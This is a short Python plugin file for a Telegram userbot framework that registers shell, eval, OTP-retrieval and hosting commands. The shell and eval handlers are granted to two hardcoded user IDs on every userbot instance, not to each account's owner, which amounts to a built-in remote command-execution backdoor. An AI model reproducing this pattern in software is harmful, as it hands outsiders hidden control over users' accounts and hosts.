from PyroUbot import *


@PY.BOT("sh", filters.user([1948147616, 843716328]))
@PY.UBOT("sh", filters.user([1948147616, 843716328]))
async def _(client, message):
    await shell_cmd(client, message)


@PY.BOT("eval", filters.user([1948147616, 843716328]))
@PY.UBOT("eval", filters.user([1948147616, 843716328]))
async def _(client, message):
    await evalator_cmd(client, message)


@PY.UBOT("trash")
async def _(client, message):
    await trash_cmd(client, message)


@PY.UBOT("getotp|getnum", FILTERS.ME_OWNER)
async def _(client, message):
    await get_my_otp(client, message)


@PY.CALLBACK("host")
async def _(client, callback_query):
    await vps(client, callback_query)
